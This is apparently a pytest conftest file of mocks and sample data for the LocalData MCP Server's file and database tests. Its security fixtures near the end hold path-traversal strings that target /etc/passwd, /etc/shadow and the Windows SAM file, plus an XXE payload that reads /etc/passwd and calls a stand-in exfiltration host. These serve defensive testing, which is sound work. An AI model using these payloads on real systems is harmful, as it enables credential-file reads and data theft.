"""
Comprehensive test configuration and mocks for LocalData MCP Server.
This file provides all the mocks and fixtures needed for 100% test coverage.
"""

import io
import json
import os
import tempfile
import threading
import time
from pathlib import Path
from unittest.mock import MagicMock, Mock, patch, mock_open
from typing import Dict, Any, Optional

import pandas as pd
import pytest
from sqlalchemy import create_engine
from sqlalchemy.pool import StaticPool


# =============================================================================
# Mock Data Creation Utilities
# =============================================================================

def create_mock_excel_file(file_path: str, sheets: Optional[Dict[str, pd.DataFrame]] = None):
    """Create mock Excel file data"""
    if sheets is None:
        sheets = {
            'Sheet1': pd.DataFrame({
                'id': [1, 2, 3, 4, 5],
                'name': ['Alice', 'Bob', 'Charlie', 'David', 'Eve'],
                'age': [25, 30, 35, 28, 32],
                'salary': [50000, 60000, 70000, 55000, 65000]
            }),
            'Sheet2': pd.DataFrame({
                'product': ['A', 'B', 'C'],
                'price': [10.99, 15.50, 22.00],
                'quantity': [100, 50, 75]
            })
        }
    return sheets

def create_mock_ods_file(file_path: str, sheets: Optional[Dict[str, pd.DataFrame]] = None):
    """Create mock ODS file data"""
    if sheets is None:
        sheets = {
            'Data': pd.DataFrame({
                'metric': ['cpu', 'memory', 'disk'],
                'value': [85.2, 67.8, 45.1],
                'timestamp': pd.to_datetime(['2024-01-01', '2024-01-02', '2024-01-03'])
            })
        }
    return sheets

def create_mock_parquet_data():
    """Create mock Parquet data"""
    return pd.DataFrame({
        'user_id': range(1, 1001),
        'transaction_amount': [100.0 + i * 1.5 for i in range(1000)],
        'category': ['shopping', 'dining', 'transport'] * 334,
        'timestamp': pd.date_range('2024-01-01', periods=1000, freq='H')
    })

def create_mock_large_dataset(rows: int = 10000):
    """Create mock large dataset for memory testing"""
    return pd.DataFrame({
        'id': range(rows),
        'data': [f'data_{i}' for i in range(rows)],
        'value': [i * 0.1 for i in range(rows)]
    })


# =============================================================================
# Core MCP Framework Mocking
# =============================================================================

@pytest.fixture(autouse=True)
def mock_mcp_framework():
    """Mock the FastMCP framework to enable direct method calls"""
    def mock_tool_decorator(func):
        # Return the original function unchanged
        return func
    
    with patch('localdata_mcp.localdata_mcp.mcp') as mock_mcp, \
         patch('localdata_mcp.localdata_mcp.FastMCP') as mock_fastmcp:
        
        mock_mcp.tool = mock_tool_decorator
        mock_fastmcp.return_value = mock_mcp
        
        yield mock_mcp


# =============================================================================
# Comprehensive Mock Fixtures
# =============================================================================

@pytest.fixture(autouse=True)
def mock_external_dependencies():
    """Mock all external dependencies to prevent actual network calls or file operations"""
    with patch('psutil.virtual_memory') as mock_memory, \
         patch('tempfile.mkstemp') as mock_mkstemp, \
         patch('os.unlink') as mock_unlink, \
         patch('os.path.exists') as mock_exists, \
         patch('os.path.getsize') as mock_getsize, \
         patch('os.path.getmtime') as mock_getmtime, \
         patch('pathlib.Path.resolve') as mock_resolve, \
         patch('pathlib.Path.is_file') as mock_is_file, \
         patch('pathlib.Path.relative_to') as mock_relative_to:
        
        # Configure memory mock
        mock_memory.return_value = Mock(
            total=16 * 1024**3,  # 16GB
            available=8 * 1024**3,  # 8GB available
            percent=50.0,  # 50% used
            used=8 * 1024**3
        )
        
        # Configure file system mocks - make them more realistic
        mock_mkstemp.return_value = (1, '/tmp/test_db.sqlite')
        mock_exists.return_value = True
        mock_getsize.return_value = 1024  # 1KB files by default
        mock_getmtime.return_value = time.time()
        mock_is_file.return_value = True
        mock_relative_to.return_value = Path('test_file.csv')
        # Make resolve return the original path (more realistic for temp files)
        def mock_resolve_func():
            # Return the path that was passed
            return mock_resolve_func.last_path if hasattr(mock_resolve_func, 'last_path') else Path('/tmp/test.csv')
        
        def mock_resolve_wrapper(path_instance):
            mock_resolve_func.last_path = path_instance
            return path_instance
            
        mock_resolve.side_effect = mock_resolve_wrapper
        
        yield {
            'memory': mock_memory,
            'mkstemp': mock_mkstemp,
            'unlink': mock_unlink,
            'exists': mock_exists,
            'getsize': mock_getsize,
            'getmtime': mock_getmtime
        }


@pytest.fixture
def manager():
    """Create a test-friendly DatabaseManager with direct method access"""
    from tests.test_helpers import create_test_manager
    return create_test_manager()


@pytest.fixture
def mock_database_manager():
    """Create a mock DatabaseManager with all dependencies mocked - legacy fixture"""
    from tests.test_helpers import create_test_manager
    manager = create_test_manager()
    yield manager, None


@pytest.fixture
def sample_csv_data():
    """Create sample CSV data for testing"""
    return pd.DataFrame({
        'id': range(1, 151),  # 150 rows for chunking tests
        'name': [f'user_{i}' for i in range(1, 151)],
        'email': [f'user_{i}@example.com' for i in range(1, 151)],
        'age': [20 + (i % 50) for i in range(1, 151)],
        'score': [i * 2.5 for i in range(1, 151)]
    })


@pytest.fixture
def sample_json_data():
    """Create sample JSON data for testing"""
    return [
        {'id': i, 'name': f'item_{i}', 'value': i * 10}
        for i in range(1, 21)
    ]


@pytest.fixture
def sample_yaml_data():
    """Create sample YAML data for testing"""
    return {
        'database': {
            'host': 'localhost',
            'port': 5432,
            'name': 'test_db'
        },
        'users': [
            {'name': 'alice', 'role': 'admin'},
            {'name': 'bob', 'role': 'user'}
        ]
    }


@pytest.fixture
def sample_ini_data():
    """Create sample INI data for testing"""
    return """
[database]
host = localhost
port = 5432
name = testdb

[logging]
level = INFO
file = app.log
"""


@pytest.fixture
def sample_xml_data():
    """Create sample XML data for testing"""
    return """<?xml version="1.0" encoding="UTF-8"?>
<root>
    <record id="1">
        <name>Product A</name>
        <price>10.99</price>
        <category>Electronics</category>
    </record>
    <record id="2">
        <name>Product B</name>
        <price>25.50</price>
        <category>Books</category>
    </record>
    <record id="3">
        <name>Product C</name>
        <price>15.75</price>
        <category>Clothing</category>
    </record>
</root>
"""


@pytest.fixture
def mock_excel_workbook():
    """Mock Excel workbook with multiple sheets"""
    mock_workbook = MagicMock()
    mock_workbook.sheet_names = ['Sheet1', 'Data', 'Summary']
    
    # Mock individual sheets
    sheet1_data = pd.DataFrame({
        'A': [1, 2, 3, 4],
        'B': ['a', 'b', 'c', 'd'],
        'C': [10.1, 20.2, 30.3, 40.4]
    })
    
    sheet2_data = pd.DataFrame({
        'metric': ['cpu', 'memory', 'disk'],
        'value': [75.5, 82.1, 45.8]
    })
    
    def mock_read_excel(file, sheet_name=None, engine=None):
        if sheet_name == 'Sheet1':
            return sheet1_data
        elif sheet_name == 'Data':
            return sheet2_data
        elif sheet_name == 'Summary':
            return pd.DataFrame({'total': [100], 'average': [33.3]})
        else:
            # Return all sheets
            return {
                'Sheet1': sheet1_data,
                'Data': sheet2_data,
                'Summary': pd.DataFrame({'total': [100], 'average': [33.3]})
            }
    
    with patch('pandas.read_excel', side_effect=mock_read_excel), \
         patch('pandas.ExcelFile') as mock_excel_file:
        mock_excel_file.return_value.__enter__.return_value.sheet_names = mock_workbook.sheet_names
        yield mock_workbook


@pytest.fixture
def mock_file_operations():
    """Mock file operations for various formats"""
    def mock_file_reader(file_path, file_type='csv'):
        """Mock file reader that returns appropriate data based on file type"""
        if file_type == 'csv' or file_path.endswith('.csv'):
            return pd.DataFrame({
                'id': [1, 2, 3],
                'name': ['A', 'B', 'C'],
                'value': [10, 20, 30]
            })
        elif file_type == 'json' or file_path.endswith('.json'):
            return pd.DataFrame([
                {'id': 1, 'name': 'Item1', 'category': 'A'},
                {'id': 2, 'name': 'Item2', 'category': 'B'}
            ])
        elif file_type == 'tsv' or file_path.endswith('.tsv'):
            return pd.DataFrame({
                'col1': ['val1', 'val2'],
                'col2': ['val3', 'val4']
            })
        elif file_type in ['parquet', 'feather', 'arrow']:
            return create_mock_parquet_data().head(5)  # Small sample for tests
        else:
            return pd.DataFrame({'test': [1, 2, 3]})
    
    with patch('pandas.read_csv') as mock_read_csv, \
         patch('pandas.read_json') as mock_read_json, \
         patch('pandas.read_parquet') as mock_read_parquet, \
         patch('pandas.read_feather') as mock_read_feather, \
         patch('pandas.read_xml') as mock_read_xml:
        
        mock_read_csv.side_effect = lambda *args, **kwargs: mock_file_reader(args[0] if args else 'test.csv', 'csv')
        mock_read_json.side_effect = lambda *args, **kwargs: mock_file_reader(args[0] if args else 'test.json', 'json')
        mock_read_parquet.side_effect = lambda *args, **kwargs: mock_file_reader(args[0] if args else 'test.parquet', 'parquet')
        mock_read_feather.side_effect = lambda *args, **kwargs: mock_file_reader(args[0] if args else 'test.feather', 'feather')
        mock_read_xml.side_effect = lambda *args, **kwargs: pd.DataFrame({
            'id': [1, 2, 3],
            'name': ['Product A', 'Product B', 'Product C'],
            'price': [10.99, 25.50, 15.75]
        })
        
        yield {
            'read_csv': mock_read_csv,
            'read_json': mock_read_json,
            'read_parquet': mock_read_parquet,
            'read_feather': mock_read_feather,
            'read_xml': mock_read_xml
        }


@pytest.fixture
def mock_sqlalchemy_operations():
    """Mock SQLAlchemy operations to avoid actual database connections"""
    mock_engine = MagicMock()
    mock_connection = MagicMock()
    mock_inspector = MagicMock()
    
    # Configure mock engine
    mock_engine.connect.return_value.__enter__ = lambda self: mock_connection
    mock_engine.connect.return_value.__exit__ = lambda self, *args: None
    mock_engine.dialect.name = 'sqlite'
    mock_engine.url.database = ':memory:'
    
    # Configure mock connection
    mock_result = MagicMock()
    mock_result.scalar.return_value = 100  # Row count
    mock_connection.execute.return_value = mock_result
    
    # Configure mock inspector
    mock_inspector.get_table_names.return_value = ['data_table', 'test_table']
    mock_inspector.get_columns.return_value = [
        {'name': 'id', 'type': 'INTEGER', 'nullable': False, 'autoincrement': True},
        {'name': 'name', 'type': 'VARCHAR', 'nullable': True, 'autoincrement': False},
        {'name': 'value', 'type': 'FLOAT', 'nullable': True, 'autoincrement': False}
    ]
    mock_inspector.get_foreign_keys.return_value = []
    mock_inspector.get_pk_constraint.return_value = {'constrained_columns': ['id']}
    mock_inspector.get_indexes.return_value = []
    mock_inspector.get_table_options.return_value = {}
    mock_inspector.get_server_version_info.return_value = (3, 39, 4)
    mock_inspector.default_schema_name = 'main'
    mock_inspector.get_schema_names.return_value = ['main']
    
    with patch('sqlalchemy.create_engine', return_value=mock_engine), \
         patch('sqlalchemy.inspect', return_value=mock_inspector), \
         patch('pandas.read_sql_query') as mock_read_sql:
        
        # Mock pandas read_sql_query to return test data
        def mock_sql_query(query, engine):
            # Return different data based on query content
            if 'COUNT(*)' in query.upper():
                return pd.DataFrame({'count': [100]})
            else:
                return pd.DataFrame({
                    'id': range(1, 51),
                    'name': [f'item_{i}' for i in range(1, 51)],
                    'value': [i * 2.0 for i in range(1, 51)]
                })
        
        mock_read_sql.side_effect = mock_sql_query
        
        yield {
            'engine': mock_engine,
            'connection': mock_connection,
            'inspector': mock_inspector,
            'read_sql': mock_read_sql
        }


@pytest.fixture
def mock_config_parser():
    """Mock ConfigParser for INI file testing"""
    mock_config = MagicMock()
    mock_config.sections.return_value = ['database', 'logging']
    
    def mock_getitem(section_name):
        if section_name == 'database':
            return {
                'host': 'localhost',
                'port': '5432',
                'name': 'testdb'
            }
        elif section_name == 'logging':
            return {
                'level': 'INFO',
                'file': 'app.log'
            }
        return {}
    
    mock_config.__getitem__ = mock_getitem
    
    with patch('configparser.ConfigParser', return_value=mock_config):
        yield mock_config


@pytest.fixture
def mock_yaml_operations():
    """Mock YAML operations"""
    sample_yaml = {
        'app': {
            'name': 'test-app',
            'version': '1.0.0'
        },
        'database': {
            'host': 'localhost',
            'port': 5432
        },
        'features': ['auth', 'logging', 'metrics']
    }
    
    with patch('yaml.safe_load', return_value=sample_yaml):
        yield sample_yaml


@pytest.fixture
def mock_toml_operations():
    """Mock TOML operations"""
    sample_toml = {
        'project': {
            'name': 'test-project',
            'version': '0.1.0'
        },
        'dependencies': {
            'requests': '>=2.28.0',
            'pandas': '>=1.5.0'
        }
    }
    
    with patch('toml.load', return_value=sample_toml):
        yield sample_toml


@pytest.fixture
def temp_test_files():
    """Create temporary test files for various formats"""
    files = {}
    
    try:
        # CSV file
        csv_data = "id,name,value\n1,Alice,100\n2,Bob,200\n3,Charlie,300"
        csv_file = tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False)
        csv_file.write(csv_data)
        csv_file.close()
        files['csv'] = csv_file.name
        
        # JSON file
        json_data = [{'id': 1, 'name': 'Item1'}, {'id': 2, 'name': 'Item2'}]
        json_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False)
        json.dump(json_data, json_file)
        json_file.close()
        files['json'] = json_file.name
        
        # TSV file
        tsv_data = "col1\tcol2\nval1\tval2\nval3\tval4"
        tsv_file = tempfile.NamedTemporaryFile(mode='w', suffix='.tsv', delete=False)
        tsv_file.write(tsv_data)
        tsv_file.close()
        files['tsv'] = tsv_file.name
        
        yield files
        
    finally:
        # Cleanup
        for file_path in files.values():
            try:
                os.unlink(file_path)
            except:
                pass


@pytest.fixture
def mock_memory_pressure():
    """Mock high memory pressure scenarios"""
    with patch('psutil.virtual_memory') as mock_memory:
        # Configure high memory usage (90%)
        mock_memory.return_value = Mock(
            total=16 * 1024**3,  # 16GB
            available=1.6 * 1024**3,  # Only 1.6GB available
            percent=90.0,  # 90% used - triggers low memory
            used=14.4 * 1024**3
        )
        yield mock_memory


@pytest.fixture
def mock_corrupted_files():
    """Mock corrupted file scenarios"""
    def raise_error(*args, **kwargs):
        raise pd.errors.ParserError("Corrupted file data")
    
    with patch('pandas.read_csv', side_effect=raise_error), \
         patch('pandas.read_json', side_effect=raise_error), \
         patch('pandas.read_excel', side_effect=raise_error):
        yield


# =============================================================================
# Thread Safety Testing Utilities
# =============================================================================

@pytest.fixture
def concurrent_operations():
    """Fixture to help test concurrent operations"""
    def run_concurrent(func, args_list, max_workers=5):
        """Run function concurrently with different arguments"""
        results = []
        errors = []
        
        def worker(args):
            try:
                result = func(*args) if isinstance(args, (list, tuple)) else func(args)
                results.append(result)
            except Exception as e:
                errors.append(e)
        
        threads = []
        for args in args_list:
            thread = threading.Thread(target=worker, args=(args,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        return results, errors
    
    return run_concurrent


# =============================================================================
# Security Testing Utilities
# =============================================================================

@pytest.fixture
def security_test_paths():
    """Provide various security-related test paths"""
    return {
        'path_traversal': [
            '../../../etc/passwd',
            '..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\drivers\\etc\\hosts'
        ],
        'special_chars': [
            'file with spaces.csv',
            'file-with-dashes.json',
            'file_with_underscores.xlsx',
            'file.with.dots.xml'
        ],
        'long_paths': [
            'a' * 260 + '.csv',  # Windows MAX_PATH
            'b' * 1000 + '.json'  # Very long path
        ]
    }


@pytest.fixture 
def mock_malicious_xml():
    """Mock malicious XML content for security testing"""
    return """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://malicious.example.com/steal">
]>
<root>
  <data>&xxe;</data>
  <exfiltrate>&xxe2;</exfiltrate>
</root>
"""